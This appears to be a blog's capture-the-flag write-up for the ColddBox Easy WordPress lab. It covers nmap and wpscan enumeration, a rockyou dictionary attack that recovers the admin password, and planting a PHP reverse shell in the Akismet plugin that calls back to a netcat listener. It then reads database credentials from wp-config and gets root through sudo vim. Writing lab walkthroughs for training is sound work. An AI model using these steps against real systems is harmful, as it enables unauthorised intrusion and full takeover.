@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>(EN) Write-up : C0lddBox :: Back</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Author: C0ldd
+Description: Welcome to ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field, good luck!
+Download:(https://mega.nz/file/VldHiIgA#4nRI2LPZs_x48_-ryCkPvL6Em2lQTSJEKvoReieDMec)
+Operating system: Linux
+What will be covered in this write-up:
+-enumeration
+-reverse-shell
+-privileges escalation
+ENUMERATION First, we need to find out where the machine is located on the network:
+nmap -sP 10.0.2.15/24
+-sP: it means ping scan, it considers that hosts are all up, so it doesn&amp;rsquo;t need to discover them." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://backkk/back.github.io/post/c0ldd_box/writeupp_c0ldd/" />
+
+
+
+
+<link rel="stylesheet" href="https://backkk/back.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://backkk/back.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://backkk/back.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://backkk/back.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="(EN) Write-up : C0lddBox">
+<meta property="og:description" content="Author: C0ldd
+Description: Welcome to ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field, good luck!
+Download:(https://mega.nz/file/VldHiIgA#4nRI2LPZs_x48_-ryCkPvL6Em2lQTSJEKvoReieDMec)
+Operating system: Linux
+What will be covered in this write-up:
+-enumeration
+-reverse-shell
+-privileges escalation
+ENUMERATION First, we need to find out where the machine is located on the network:
+nmap -sP 10.0.2.15/24
+-sP: it means ping scan, it considers that hosts are all up, so it doesn&amp;rsquo;t need to discover them." />
+<meta property="og:url" content="https://backkk/back.github.io/post/c0ldd_box/writeupp_c0ldd/" />
+<meta property="og:site_name" content="Back" />
+
+  
+    <meta property="og:image" content="https://backkk/back.github.io/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-11-01 20:06:25 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Back
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/back.github.io/">Home</a></li>
+        
+      
+        
+          <li><a href="/back.github.io/whoami">Whoami</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/back.github.io/">Home</a></li>
+      
+    
+      
+        <li><a href="/back.github.io/whoami">Whoami</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://backkk/back.github.io/post/c0ldd_box/writeupp_c0ldd/">(EN) Write-up : C0lddBox</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-11-01 
+      </span>
+    
+    
+  </div>
+
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Author:</strong> C0ldd<br>
+<strong>Description:</strong> <em>Welcome to ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field, good luck!</em></p>
+<p><strong>Download:</strong>(<a href="https://mega.nz/file/VldHiIgA#4nRI2LPZs_x48_-ryCkPvL6Em2lQTSJEKvoReieDMec">https://mega.nz/file/VldHiIgA#4nRI2LPZs_x48_-ryCkPvL6Em2lQTSJEKvoReieDMec</a>)</p>
+<p><strong>Operating system:</strong> Linux</p>
+<p><strong>What will be covered in this write-up:</strong><br>
+-enumeration<br>
+-reverse-shell<br>
+-privileges escalation</p>
+<pre><code>ENUMERATION
+</code></pre><p>First, we need to find out where the machine is <strong>located</strong> on the network:</p>
+<p><code>nmap -sP 10.0.2.15/24</code></p>
+<p><strong>-sP</strong>: it means <strong>ping scan</strong>, it considers that hosts are all up, so it doesn&rsquo;t need to discover them. It is a fast way to discover a machine.</p>
+<p>We found an IP address ! :</p>
+<p><code>10.0.2.6</code></p>
+<p>Now, we can scan it with special options, to discover in details <strong>what&rsquo;s running</strong> on this machine :</p>
+<p><code>nmap -A -T5 -n 10.0.2.6</code></p>
+<p><strong>-A</strong> : <strong>Agressive</strong> mode (discovers the OS version and the services versions).</p>
+<p><strong>-T5</strong> : timing template in <strong>insane</strong> mode, it determines the speed of the scan, more it&rsquo;s fast, less it is discreet.</p>
+<p><strong>-n</strong> : tells Nmap to <strong>never</strong> reverse DNS resolve active hosts it has found. Since DNS resolution is often <strong>slow</strong>, this <strong>speeds</strong> things up.</p>
+<p>Here is the scan output:</p>
+<pre><code>PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.1.31
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: ColddBox | One more machine
+MAC Address: 08:00:27:7A:7E:2C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+</code></pre><p>Alright, we only have a website running on the port 80, hosting a <strong>WordPress</strong>, running on <strong>Apache 2.4.18</strong>, let&rsquo;s check what it looks like :<img src="../img/c0ldd_wp_background.PNG" alt="wordpress_site"></p>
+<p>We can use a tool to scan this WordPress website, <strong>wpscan</strong> (a tool used to enumerate vulnerable stuffs on WordPress such as vulnerable plugins):</p>
+<p><code>wpscan --url http://10.0.2.6 -e u vp</code></p>
+<p><strong>-e</strong>: enumeration mode<br>
+<strong>u</strong>: user enumeration, without arguments it checks if there is 10 users max.<br>
+<strong>vp</strong> : vulnerable plugins</p>
+<p>Here is the output:</p>
+<pre><code>[i] User(s) Identified:
+
+[+] the cold in person
+ | Found By: Rss Generator (Passive Detection)
+
+[+] c0ldd
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] hugo
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] philip
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+</code></pre><p>We found some <strong>users</strong> !</p>
+<p><strong>wpscan</strong> provides a <strong>dictionnary attack tool</strong>, so let&rsquo;s use it:</p>
+<p><code>wpscan --url http://10.0.2.6 -P /usr/share/wordlists/rockyou.txt --usernames c0ldd,philip,hugo</code></p>
+<p>Here is the output:</p>
+<pre><code>[!] Valid Combinations Found:
+ | Username: c0ldd, Password: 9876543210
+
+</code></pre><p>Nice ! Let&rsquo;s try to login as c0ldd on the WordPress, maybe we got the <strong>admin credentials</strong> ? So let&rsquo;s go in <strong>/wp-admin/</strong>:
+<img src="../img/users_wp.PNG" alt="wp_users"></p>
+<p>We can see that the user <strong>c0ldd</strong> is the <strong>admin</strong> of the WordPress ! Perfect. We can now <strong>add</strong> or <strong>delete</strong> things, maybe we could setup a <strong>reverse-shell</strong> to have a better control of the web-server ?</p>
+<pre><code>REVERSE-SHELL
+</code></pre><p>We could put a PHP reverse-shell code into the plugins configuration. All we have to do is to go ro the <strong>Plugins</strong> menu, then you can modify the <strong>Akismset</strong> plugin, go into the file <strong>akismet/class.akismet-admin.php</strong>, then just select all its content and delete it to paste the reverse shell.</p>
+<p>The code I used for the reverse-shell is located in <code>/usr/share/webshells/php-reverse-shell.php</code></p>
+<p>Then you have to <strong>modify</strong> the reverse-shell code, you need to put your <strong>listening IP</strong> and the <strong>port</strong> that will be waiting for a connexion. It is presented like that :</p>
+<pre><code>$ip = '10.0.2.15';  // CHANGE THIS
+$port = 4443;       // CHANGE THIS
+</code></pre><p>When it&rsquo;s done, <strong>update</strong> the changes.</p>
+<p>The principle of the <strong>reverse-shell</strong> is that a remote computer will connect you yours, and each command you will type will be sent to his computer and it will <strong>display the output(s)</strong> of your commands on <strong>your</strong> own shell.</p>
+<p>So let&rsquo;s wait for the connexion on our computer with netcat:</p>
+<p><code>nc -lvp 4443</code></p>
+<p><strong>-l</strong>: listen mode<br>
+<strong>-v</strong>: verbose mode<br>
+<strong>-p</strong>: port which the IP is listening on</p>
+<p>Now let&rsquo;s connect from the WordPress, we modified a plugin, so all we got to do to launch the connexion request is to click on <strong>activate</strong> or <strong>deactivate</strong> function of the <strong>akismet</strong> plugin.</p>
+<p>Here we are, I am connected !</p>
+<pre><code>listening on [any] 4443 ...
+10.0.2.6: inverse host lookup failed: Unknown host
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.6] 48442
+Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 
+UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 19:51:01 up  2:12,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre><p>We need to find the flag of the user <strong>c0ldd</strong> before trying to be <strong>#root</strong>, first, let&rsquo;s spawn a tty (terminal). The only command that worked for me was:</p>
+<p><code>$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<p>Now we have a terminal, we can see that we are the user <strong>www-data</strong>, so we have rights to edit/delete some files of the web server. Let&rsquo;s check it out!</p>
+<p><code>cd /var/www/html</code></p>
+<p>c</p>
+<pre><code>/** MySQL database username */
+define('DB_USER', 'c0ldd');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'cybersecurity');
+</code></pre><p>Perfect, now let&rsquo;s try to login as <strong>c0ldd</strong> with the password <strong>cybersecurity</strong> :</p>
+<pre><code>www-data@ColddBox-Easy:/var/www/html$ su - c0ldd
+su - c0ldd
+Password: cybersecurity
+
+c0ldd@ColddBox-Easy:~$ id
+id
+uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd)
+</code></pre><p>It works ! We just have to cat the user flag :</p>
+<pre><code>cat user.txt | base64 -d Felicidades
+primer nivel conseguido!c0ldd@ColddBox-Easy
+</code></pre><p>We now need to be <strong>#root</strong>&hellip;</p>
+<pre><code>PRIVILEGE ESCALATION
+</code></pre><p>The objective of the privilege escalation is to use system <strong>misconfigurations</strong> to escalate to the <strong>#root</strong> user.
+This website is usefull to find some :</p>
+<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></p>
+<p>I found that the command <code>sudo -l</code> lists the allowed (and forbidden) commands for the invoking user</p>
+<p>You can also use the tool Linpeas that enumerate many things for the privilege escalation, check it out:</p>
+<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a></p>
+<p>After typing the <code>sudo -l</code> command, i found this:</p>
+<pre><code>(root) /usr/bin/vim
+(root) /bin/chmod
+(root) /usr/bin/ftp
+</code></pre><p>I can run these command as <strong>#root</strong> but without placing <strong>sudo</strong> in front of em. It&rsquo;s a good way to try a privilege escalation. Let&rsquo;s checkout for vim, there is a good website that gives us commands to privesc, or to spawn a tty, make a reverse shell and it is :</p>
+<p><a href="https://gtfobins.github.io/gtfobins/vim/#suid">GTFO Bins</a></p>
+<p>So <strong>GTFO Bins</strong> gave us something to type with vim, let&rsquo;s execute it :</p>
+<p><code>sudo vim -c ':!/bin/sh'</code></p>
+<p>We are <strong>#root</strong> !! We can now <strong>cat</strong> the <strong>#root</strong> flag :)
+<code>Felicidades, primer nivel conseguido!#</code></p>
+<pre><code>SPECIAL THANKS
+</code></pre><p>I&rsquo;d like to thanks <strong>Kr0wZ</strong>, who guided me for this CTF, you can check out his blog :
+<a href="https://kr0wz.github.io/fr/">KrowZ Blog</a><br>
+Thanks to <strong>Mysaz</strong> who also helped me for this CTF<br>
+Thanks to <strong>IsIghTT</strong>, here is his discord <strong>IsIghTT#3829</strong></p>
+
+      </div></div>
+
+  
+  
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://backkk/back.github.io/assets/main.js"></script>
+<script src="https://backkk/back.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
